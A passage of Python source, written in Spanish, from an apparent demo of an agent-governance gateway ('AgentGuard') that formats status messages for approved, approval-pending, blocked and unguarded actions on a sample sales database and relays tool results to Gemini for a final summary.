                        tot = ui_payload.get("total_amount", 0.0)
                        return (
                            f"✅ ¡Hola! Aquí tienes las {cnt} ventas mayores a $1,000 del mes pasado registradas en ACME Corp. "
                            f"El monto total facturado asciende a ${tot:,.2f} USD. "
                            f"He desplegado el desglose en la tabla interactiva y los datos están listos para ser graficados."
                        )
                    if is_pie_chart_shortcut:
                        return (
                            "📊 ¡Gráfico generado exitosamente! He preparado la distribución de ventas por producto "
                            "en una gráfica circular interactiva con los porcentajes reales correspondientes."
                        )
                    return (
                        f"✅ Operación autorizada exitosamente por AgentGuard bajo política comercial. "
                        f"La acción '{action_name}' fue ejecutada en el servicio destino con latencia "
                        f"{gateway_verdicts[0].get('latency_ms', 0)} ms."
                    )
                if dec == "REQUIRE_APPROVAL":
                    return (
                        f"⏳ Operación suspendida sujeta a gobernanza humana (HITL). "
                        f"El monto o riesgo de '{action_name}' excede los límites autónomos. "
                        f"Ticket registrado en la bandeja de aprobación de AgentGuard."
                    )
                if effective_dispatch_action == "delete_sales":
                    return (
                        "🛡️ Puedo filtrar u ocultar esos registros en esta pantalla y actualizar tu gráfico de torta, "
                        "pero no tengo autorización para escribir ni borrar datos en la base de datos de ACME "
                        "(bloqueado por política de seguridad en AgentGuard)."
                    )
                return (
                    f"🛡️ Bloqueo de seguridad preventivo emitido por AgentGuard (PDP). "
                    f"La acción '{action_name}' fue rechazada por política estricta. "
                    f"Detalle: {gateway_verdicts[0].get('error_message', 'Acceso denegado')}."
                )

            if acme_results and acme_results[0].get("is_database_wiped"):
                return (
                    "🚨 ERROR CATASTRÓFICO: La base de datos de ACME Corporation ha sido purgada. "
                    "El servidor no puede responder a solicitudes operativas (503 Service Unavailable)."
                )
            if acme_results and acme_results[0].get("status") == "wiped":
                return (
                    "💥 PELIGRO CRÍTICO: La acción destructiva se ejecutó directamente sin pasar por AgentGuard. "
                    "Todas las tablas de productos, clientes, cotizaciones, reembolsos y ventas fueron eliminadas de la base de datos."
                )
            if acme_results and acme_results[0].get("result", {}).get("is_tampered"):
                res_tamper = acme_results[0]["result"]
                return (
                    f"⚠️ ALTERACIÓN GRAVE: Al omitir AgentGuard, el precio de '{res_tamper['product_name']}' "
                    f"fue rebajado a ${res_tamper['new_price']} USD (Precio Base: ${res_tamper['base_price']} USD). "
                    f"Se ha provocado un sabotaje directo en el catálogo oficial de ACME."
                )
            if action_name == "delete_sales":
                cnt = acme_results[0].get("result", {}).get("deleted_count", 0)
                return (
                    f"💥 ALERTA: En Modo Directo (sin AgentGuard), se eliminaron {cnt} registros de ventas "
                    f"directamente de SQLite. ¡Los datos han desaparecido de la base de datos real!"
                )
            if effective_dispatch_action == "query_sales":
                cnt = ui_payload.get("total_records", len(ui_payload.get("table_data", [])))
                return f"⚡ Consulta de ventas ejecutada directamente sobre SQLite ({cnt} registros recuperados)."
            return (
                f"⚡ Acción '{action_name}' ejecutada directamente en ACME Corp omitiendo salvaguardas de gobernanza. "
                f"Resultado: {json.dumps(acme_results[0] if acme_results else {}, ensure_ascii=False)}"
            )

        # -------------------------------------------------------------------
        # Cierre del Ciclo: Síntesis Final
        # -------------------------------------------------------------------
        if use_llm and tool_call_found:
            steps.append({
                "step": 6,
                "title": "Síntesis Final con Google Gemini (Turno 2)",
                "detail": "Enviando respuesta de la herramienta a Gemini para obtener el análisis final en español...",
                "status": "info",
            })

            canonical_tool_name = tool_call_found.get("name")
            turn1_function_calls = [
                p["functionCall"]
                for p in model_turn_parts
                if isinstance(p, dict) and isinstance(p.get("functionCall"), dict)
            ]
            if not turn1_function_calls:
                turn1_function_calls = [tool_call_found]

            function_response_parts: List[Dict[str, Any]] = []
            for fc_idx, fc in enumerate(turn1_function_calls):
                fc_name = fc.get("name") or canonical_tool_name
                fc_response_body: Dict[str, Any] = {
                    "name": fc_name,
                    "response": (
                        function_response_payload
                        if fc_idx == 0
                        else {
                            "status": "skipped",
                            "message": "Se ejecutó únicamente la primera invocación de herramienta en este turno.",
                        }
                    ),
                }
                if fc.get("id"):
                    fc_response_body["id"] = fc["id"]
                function_response_parts.append({"functionResponse": fc_response_body})

            payload_turn_2 = {
                "systemInstruction": {"parts": [{"text": system_instruction_text}]},
                "contents": [
                    {"role": "user", "parts": [{"text": user_prompt}]},
                    {"role": "model", "parts": model_turn_parts or [{"functionCall": tool_call_found}]},
                    {
                        "role": "user",
                        "parts": function_response_parts,
                    },
                ],
                "tools": [{"functionDeclarations": GEMINI_FUNCTION_DECLARATIONS}],
                "generationConfig": _build_generation_config(active_gemini_model),
            }

            try:
                async with httpx.AsyncClient(timeout=45.0) as client:
                    resp_2 = await client.post(gemini_url, json=payload_turn_2)
                    if resp_2.status_code == 200:
                        cand_2 = resp_2.json().get("candidates", [])
                        parts_2 = cand_2[0].get("content", {}).get("parts", []) if cand_2 else []
                        final_answer = "".join(
                            p.get("text", "") for p in parts_2 if isinstance(p, dict) and not p.get("thought")
                        ).strip()
                        if not final_answer:
                            final_answer = _build_deterministic_answer()
                    else:
                        err_snippet = (resp_2.text or "")[:500]
                        logger.warning(
                            "Gemini Turno 2 respondió HTTP %s (%s): %s",
                            resp_2.status_code,
                            active_gemini_model,
                            err_snippet,
                        )
                        steps.append({
                            "step": 6,
                            "title": f"Fallback en síntesis de Gemini (HTTP {resp_2.status_code})",
                            "detail": f"Detalle devuelto por Gemini API: {err_snippet or 'Sin cuerpo de error'}",
                            "status": "warning",
                        })
                        final_answer = _build_deterministic_answer()
            except Exception as exc:
                detail = str(exc).strip() or type(exc).__name__
                logger.warning("Fallo al completar Turno 2 de Gemini (%s): %s", type(exc).__name__, detail)
                steps.append({
                    "step": 6,
                    "title": f"Fallback en síntesis de Gemini ({type(exc).__name__})",
                    "detail": detail,
                    "status": "warning",
                })
                final_answer = _build_deterministic_answer()

        else:
            # Síntesis determinística estructurada en español
            final_answer = _build_deterministic_answer()

        steps.append({
            "step": 7 if use_llm else 6,
            "title": "Conclusión del Agente",
            "detail": final_answer,
            "status": "success" if "✅" in final_answer or "📊" in final_answer else ("warning" if "⏳" in final_answer else "info"),
        })

        return {
            "mode": mode,
            "use_llm": use_llm,
            "model_used": active_gemini_model if use_llm else "N/A (Disparo Guiado / Determinístico)",
            "llm_tool_calls": llm_tool_calls,
            "gateway_verdicts": gateway_verdicts,
            "acme_results": acme_results,
            "final_answer": final_answer,
            "steps": steps,
            "ui_payload": ui_payload,
        }
